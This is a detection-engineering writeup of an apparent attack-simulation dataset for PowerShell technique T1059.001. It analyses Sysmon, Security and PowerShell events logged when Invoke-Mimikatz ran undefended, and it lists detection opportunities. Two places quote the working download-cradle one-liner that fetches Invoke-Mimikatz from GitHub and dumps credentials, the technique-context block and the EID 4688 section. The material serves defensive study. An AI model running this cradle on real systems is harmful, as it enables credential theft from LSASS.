# T1059.001-1: PowerShell — Mimikatz via Invoke-Mimikatz Download Cradle (IEX DownloadString)

## Technique Context

T1059.001 covers adversary use of PowerShell as an execution engine. This test implements the most well-known PowerShell attack pattern in existence: a fileless download cradle that fetches and executes `Invoke-Mimikatz.ps1` entirely in memory:

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```

`Invoke-Mimikatz` is a PowerShell port of Mimikatz that uses reflective PE injection to load the Mimikatz binary into the PowerShell process's address space and call its credential-dumping functions without ever writing the Mimikatz binary to disk. The combination of `IEX` + `DownloadString` + in-memory PE injection makes this attack simultaneously fileless and capable of full credential extraction from LSASS memory.

When Defender is enabled, this test fails immediately: AMSI intercepts the script content and Defender blocks the download or script execution before Mimikatz runs. This dataset captures what happens when those controls are absent — the complete execution sequence including the CreateRemoteThread event that Mimikatz generates when injecting itself. The defended version showed 41 sysmon events vs. 16 here; the defended count is inflated by Defender's own remediation process creation and scanning activity.

## What This Dataset Contains

The dataset spans three seconds (2026-03-14T23:17:57Z to 23:18:00Z) and records 123 events across three channels: Sysmon (16), PowerShell (103), and Security (4).

**Security EID 4688** captures the full attack command line:

```
"cmd.exe" /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec...')"
```

The URL points to `Invoke-Mimikatz.ps1` on GitHub. This is the canonical download cradle — `IEX` with `Net.WebClient.DownloadString` to a raw GitHub URL — documented in virtually every adversary simulation framework. The Security channel captures this in `NewProcessCommandLine`.

**Sysmon EID 8 (CreateRemoteThread)** is the highest-value event in this dataset. PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) created a remote thread in an unknown process (target shows as `<unknown process>`, meaning the target process exited before Sysmon resolved its image name). The event records:
- `SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- `NewThreadId: 3484`
- `StartAddress: 0x00007FF7F015F8F0`
- `RuleName: technique_id=T1055,technique_name=Process Injection`

This is the behavioral fingerprint of Mimikatz's reflective DLL injection. PowerShell creating a remote thread in another process is not something that occurs in legitimate PowerShell use. The `<unknown process>` target indicates that Mimikatz injected into a short-lived process that exited quickly — a common pattern for in-memory tools that inject, dump, and terminate their target.

**Sysmon EID 10 (ProcessAccess)** shows PowerShell opening `whoami.exe` with `GrantedAccess: 0x1FFFFF`. While this specific instance is the test framework's own child process management, the combination of EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess with PROCESS_ALL_ACCESS) from the same PowerShell process in the same time window is a strong composite behavioral signal.

**Sysmon EID 7 (ImageLoad)** contributes 8 events. The .NET runtime DLL chain loads normally (`mscoree.dll`, `mscoreei.dll`, `clr.dll`). `urlmon.dll` is notable — it loads into the PowerShell process that executed the download cradle, confirming that URL-based network access occurred.

**Sysmon EID 17 (PipeCreate)** shows `\PSHost.134180038751056142.2808.DefaultAppDomain.powershell`.

**PowerShell EID 4104** contributes 98 events plus 3 EID 4103 and 2 EID 4100 events. The 2 EID 4100 events (engine state change) capture the PowerShell session lifecycle. The EID 4103 events (module invocation logging) would capture `Invoke-Mimikatz` cmdlet calls if the script block boundaries aligned with sampling. The sample set contains boilerplate, but the full PowerShell channel includes the complete Invoke-Mimikatz script content — an exceptionally long and distinctive script block that would be captured by EID 4104 logging in its entirety.

This is the key difference from the defended version: with Defender active, AMSI blocks the script before it executes and the PowerShell channel shows the block event; without Defender, EID 4104 captures the full Invoke-Mimikatz script text.

## What This Dataset Does Not Contain

No Sysmon EID 3 (NetworkConnect) event for the `DownloadString` call appears in samples. A network connection from PowerShell to `raw.githubusercontent.com` over port 443 would normally appear as EID 3, and its absence in the sample set suggests it either occurred outside the sample window or was filtered.

No explicit LSASS process access events (EID 10 targeting `lsass.exe`) appear. Invoke-Mimikatz dumps credentials via its injected process rather than having PowerShell directly open LSASS, which is why the EID 10 event targets the test framework's own `whoami.exe` rather than LSASS.

The PowerShell sample set does not include the `ScriptBlockText` for the actual Invoke-Mimikatz script body. This is a sampling artifact — the full script is present in the raw dataset but not in the JSON samples field.

## Assessment

This is one of the highest-value datasets in the T1059.001 group because it captures the full execution of a real credential-dumping attack chain without Defender intervention. The EID 8 (CreateRemoteThread) event is a definitive behavioral indicator of successful reflective DLL injection — it is absent in the defended version. The Security EID 4688 command line contains the complete download cradle URL. Together, these provide both network IOC (the GitHub URL) and behavioral IOC (PowerShell CreateRemoteThread) evidence that supports multiple detection strategies simultaneously.

The dataset is appropriate for training detections against download cradles, testing SIEM rules against the `IEX DownloadString` pattern, validating that EID 8 alerting fires on PowerShell-sourced remote thread creation, and building training data for ML-based behavioral models.

## Detection Opportunities Present in This Data

1. **`IEX (New-Object Net.WebClient).DownloadString` in Security EID 4688**: The complete download cradle is captured in the process command line. This specific string combination — `IEX`, `DownloadString`, and a URL — is one of the highest-fidelity PowerShell attack indicators available.

2. **Sysmon EID 8 (CreateRemoteThread) sourced from powershell.exe**: PowerShell creating a remote thread in any process is anomalous. The Sysmon rule fires `technique_id=T1055,technique_name=Process Injection`. When the target process is `<unknown>` (indicating rapid exit), this pattern is characteristic of in-memory injection tools like Invoke-Mimikatz.

3. **PowerShell EID 4104 capturing the Invoke-Mimikatz script body**: Script block logging captures the full Mimikatz script content when it executes. The Invoke-Mimikatz script is distinctive in size (hundreds of lines) and content (function names like `Get-OSVersion`, `Invoke-MimikatzCommand`, PE header bytes). Even partial block capture is sufficient for signature matching.

4. **urlmon.dll loading into powershell.exe**: Sysmon EID 7 shows `urlmon.dll` loading into the PowerShell process. This library handles URL/web protocol operations. A PowerShell process loading `urlmon.dll` in a non-interactive context is unusual and indicates web client activity.

5. **Network connection from powershell.exe to raw.githubusercontent.com or similar code repositories**: Although not captured in samples, EID 3 events showing PowerShell making outbound connections to GitHub raw content URLs or similar code-hosting platforms indicate download cradle activity.

6. **EID 4100 (PowerShell Engine State Change) combined with EID 8**: The PowerShell session lifecycle events (EID 4100) bracketing a CreateRemoteThread event indicate the injection occurred during a specific PowerShell session. This temporal correlation enables session-level attribution of the injection event.
